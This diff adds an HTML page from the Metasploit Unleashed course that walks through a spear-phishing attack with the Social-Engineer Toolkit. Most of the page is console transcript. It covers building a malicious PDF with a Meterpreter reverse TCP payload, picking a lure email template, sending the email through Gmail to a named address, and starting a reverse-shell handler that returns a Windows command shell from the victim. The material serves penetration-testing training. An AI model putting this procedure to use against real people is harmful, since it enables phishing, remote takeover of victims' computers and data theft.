@@ -1,0 +1,57 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+  <meta content="text/html; charset=ISO-8859-1"
+ http-equiv="Content-Type">
+  <title>Spear-Phishing Attack Vector</title>
+</head>
+<body>
+<h1 style="color: rgb(0, 0, 0);" id="firstHeading" class="firstHeading">Spear-Phishing
+Attack Vector</h1>
+<h3 style="color: rgb(0, 0, 0);" id="siteSub">From Metasploit Unleashed
+- Mastering The Framework</h3>
+<p style="color: rgb(0, 0, 0);">As mentioned previously, the spear
+phishing attack vector can be
+used to send targeted emails with malicious attachments. In this
+example, we are going to craft an attack, integrate into GMAIL and send
+a malicious PDF to the victim. One thing to note is that you can create
+and save your own templates to use for future SE attacks or you can use
+pre-built ones. When using SET just note that when hitting enter for
+defaults, it will always be port 443 as the reverse connection back and
+a reverse meterpreter payload.
+<br>
+</p>
+<pre style="color: rgb(0, 0, 0);">Select from the menu:<br><br>1.  Spear-Phishing Attack Vectors<br>2.  Website Attack Vectors<br>3.  Infectious Media Generator<br>4.  Create a Payload and Listener<br>5.  Mass Mailer Attack<br>6.  Teensy USB HID Attack Vector<br>7.  SMS Spoofing Attack Vector<br>8   Update the Metasploit Framework<br>9.  Update the Social-Engineer Toolkit<br>10. Help, Credits, and About<br>11. Exit the Social-Engineer Toolkit<br><br>Enter your choice: 1<br><br>Welcome to the SET E-Mail attack method. This module allows you<br>to specially craft email messages and send them to a large (or small)<br>number of people with attached fileformat malicious payloads. If you<br>want to spoof your email address, be sure "Sendmail" is installed (it<br>is installed in BT4) and change the config/set_config SENDMAIL=OFF flag<br>to SENDMAIL=ON.<br><br>There are two options, one is getting your feet wet and letting SET do<br>everything for you (option 1), the second is to create your own FileFormat<br>payload and use it in your own attack. Either way, good luck and enjoy!<br><br>1. Perform a Mass Email Attack<br>2. Create a FileFormat Payload<br>3. Create a Social-Engineering Template<br>4. Return to Main Menu<br><br>Enter your choice: 1<br><br>Select the file format exploit you want.<br>The default is the PDF embedded EXE.<br><br>        ********** PAYLOADS **********<br><br>1. SET Custom Written DLL Hijacking Attack Vector (RAR, ZIP)<br>2. Adobe Flash Player 'Button' Remote Code Execution<br>3. Adobe CoolType SING Table 'uniqueName' Overflow<br>4. Adobe Flash Player 'newfunction' Invalid Pointer Use<br>5. Adobe Collab.collectEmailInfo Buffer Overflow<br>6. Adobe Collab.getIcon Buffer Overflow<br>7. Adobe JBIG2Decode Memory Corruption Exploit<br>8. Adobe PDF Embedded EXE Social Engineering<br>9. Adobe util.printf() Buffer Overflow<br>10. Custom EXE to VBA (sent via RAR) (RAR required)<br>11. Adobe U3D CLODProgressiveMeshDeclaration Array Overrun<br>12. Adobe PDF Embedded EXE Social Engineering (NOJS)<br><br>Enter the number you want (press enter for default): 1<br><br>1. Windows Reverse TCP Shell<br>2. Windows Meterpreter Reverse_TCP<br>3. Windows Reverse VNC<br>4. Windows Reverse TCP Shell (x64)<br>5. Windows Meterpreter Reverse_TCP (X64)<br>6. Windows Shell Bind_TCP (X64)<br><br>Enter the payload you want (press enter for default):<br>[*] Windows Meterpreter Reverse TCP selected.<br>Enter the port to connect back on (press enter for default):<br>[*] Defaulting to port 443...<br>[*] Generating fileformat exploit...<br>[*] Please wait while we load the module tree...<br>[*] Started reverse handler on 172.16.32.129:443<br>[*] Creating 'template.pdf' file...<br>[*] Generated output file /pentest/exploits/set/src/program_junk/template.pdf<br><br>[*] Payload creation complete.<br>[*] All payloads get sent to the src/msf_attacks/template.pdf directory<br>[*] Payload generation complete. Press enter to continue.<br><br><br>As an added bonus, use the file-format creator in SET to create your attachment.<br><br>Right now the attachment will be imported with filename of 'template.whatever'<br><br>Do you want to rename the file?<br><br>example Enter the new filename: moo.pdf<br><br>1. Keep the filename, I don't care.<br>2. Rename the file, I want to be cool.<br><br>Enter your choice (enter for default): 1<br>Keeping the filename and moving on.<br><br>Social Engineer Toolkit Mass E-Mailer<br><br>There are two options on the mass e-mailer, the first would<br>be to send an email to one individual person. The second option<br>will allow you to import a list and send it to as many people as<br>you want within that list.<br><br>What do you want to do:<br><br>1. E-Mail Attack Single Email Address<br>2. E-Mail Attack Mass Mailer<br>3. Return to main menu.<br><br>Enter your choice: 1<br><br>Do you want to use a predefined template or craft<br>a one time email template.<br><br>1. Pre-Defined Template<br>2. One-Time Use Email Template<br><br>Enter your choice: 1<br>Below is a list of available templates:<br><br>1: Baby Pics<br>2: Strange internet usage from your computer<br>3: New Update<br>4: LOL...have to check this out...<br>5: Dan Brown's Angels &amp; Demons<br>6: Computer Issue<br>7: Status Report<br><br>Enter the number you want to use: 7<br><br>Enter who you want to send email to: kennedyd013@gmail.com<br><br>What option do you want to use?<br><br>1. Use a GMAIL Account for your email attack.<br>2. Use your own server or open relay<br><br>Enter your choice: 1<br>Enter your GMAIL email address: kennedyd013@gmail.com<br>Enter your password for gmail (it will not be displayed back to you):<br><br><br>SET has finished delivering the emails.<br><br>Do you want to setup a listener yes or no: yes<br>[-] ***<br>[-] * WARNING: No database support: String User Disabled Database Support<br>[-] ***<br><br>                |                    |      _) |<br> __ `__ \   _ \ __|  _` |  __| __ \  |  _ \  | __|<br> |   |   |  __/ |   (   |\__ \ |   | | (   | | |<br>_|  _|  _|\___|\__|\__,_|____/ .__/ _|\___/ _|\__|<br>                              _|<br><br><br>       =[ metasploit v3.4.2-dev [core:3.4 api:1.0]<br>+ -- --=[ 588 exploits - 300 auxiliary<br>+ -- --=[ 224 payloads - 27 encoders - 8 nops<br>       =[ svn r10268 updated today (2010.09.09)<br><br>resource (src/program_junk/meta_config)&gt; use exploit/multi/handler<br>resource (src/program_junk/meta_config)&gt; set PAYLOAD windows/meterpreter/reverse_tcp<br>PAYLOAD =&gt; windows/meterpreter/reverse_tcp<br>resource (src/program_junk/meta_config)&gt; set LHOST 172.16.32.129<br>LHOST =&gt; 172.16.32.129<br>resource (src/program_junk/meta_config)&gt; set LPORT 443<br>LPORT =&gt; 443<br>resource (src/program_junk/meta_config)&gt; set ENCODING shikata_ga_nai<br>ENCODING =&gt; shikata_ga_nai<br>resource (src/program_junk/meta_config)&gt; set ExitOnSession false<br>ExitOnSession =&gt; false<br>resource (src/program_junk/meta_config)&gt; exploit -j<br>[*] Exploit running as background job.<br>msf exploit(handler) &gt;<br>[*] Started reverse handler on 172.16.32.129:443<br>[*] Starting the payload handler...<br><br>msf exploit(handler) &gt;</pre>
+<br style="color: rgb(0, 0, 0);">
+<span style="color: rgb(0, 0, 0);">Once the attack is all setup, the
+victim opens the email and opens the PDF up:
+</span><br style="color: rgb(0, 0, 0);">
+<br style="color: rgb(0, 0, 0);">
+<div style="color: rgb(0, 0, 0);" class="center">
+<div class="floatnone"><a
+ href="http://www.offensive-security.com/metasploit-unleashed/File:SET_01.png"
+ class="image"><img alt="SET 01.png"
+ src="http://www.offensive-security.com/w/images/3/36/SET_01.png"
+ width="797" height="205"></a></div>
+</div>
+<p style="color: rgb(0, 0, 0);"><br>
+<br>
+As soon as the victim opens the attachment, a shell is presented back
+to us:
+<br>
+<br>
+</p>
+<pre style="color: rgb(0, 0, 0);">[*] Sending stage (748544 bytes) to 172.16.32.131<br>[*] Meterpreter session 1 opened (172.16.32.129:443 -&gt; 172.16.32.131:1139) at Thu Sep 09 09:58:06 -0400 2010<br><br>msf exploit(handler) &gt; sessions -i 1<br>[*] Starting interaction with 1...<br><br><u>meterpreter</u> &gt; shell<br>Process 3940 created.<br>Channel 1 created.<br>Microsoft Windows XP [Version 5.1.2600]<br>(C) Copyright 1985-2001 Microsoft Corp.<br><br>C:\Documents and Settings\Administrator\Desktop&gt;</pre>
+<p style="color: rgb(0, 0, 0);">The spear-phishing attack can send to
+multiple people or to
+individuals, it integrates into Google mail, and can be completely
+customized based on your needs for the attack vector. Overall this is
+very effective for email spear-phishing.
+<br>
+<br>
+</p>
+<div style="text-align: center; color: rgb(0, 0, 0);"><a
+ href="http://www.offensive-security.com/metasploit-unleashed/SET"
+ title="SET">SET</a></div>
+</body>
+</html>
